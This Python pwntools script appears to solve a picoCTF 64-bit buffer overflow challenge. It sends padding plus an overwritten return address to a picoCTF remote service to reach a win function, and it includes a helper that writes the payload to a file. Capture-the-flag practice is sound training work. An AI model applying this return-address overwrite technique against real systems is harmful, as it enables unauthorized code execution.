import pwn
from pathlib import Path
import time

CURR_DIR = Path(__file__).parent

def beng():
    p = pwn.remote("saturn.picoctf.net", 54856)
    # p = pwn.process('/home/dolby/repositories/crackme_challenges/x-sixty-what/vuln')
    junk = b"A" * (0x48) 
    pyload = [
        junk,                     
        pwn.p64(0x0040123b),
    ]
    p.readuntil("Welcome to 64-bit. Give me a string that gets you the flag:")
    p.sendline(b"".join(pyload))
    print(p.readline())
    p.interactive()

def write_to_file():
    path = CURR_DIR / "buff"
    junk = b"A" * (0x44) 
    pyload = [
        junk,                     
        pwn.p64(0x00401236),
        # pwn.p64(0x0000000000401236),
        # pwn.p64(0x0000000000401236),
        # pwn.p64(0x0000000000401236),
        # pwn.p64(0x0000000000401236),
        # pwn.p64(0x0000000000401236),
        # pwn.p64(0x0000000000401236)
    ]
    path.write_bytes(b"".join(pyload))

beng()
# write_to_file()
